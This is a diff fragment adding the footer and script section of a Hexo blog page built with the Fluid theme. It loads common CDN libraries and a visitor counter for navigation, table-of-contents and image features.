+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
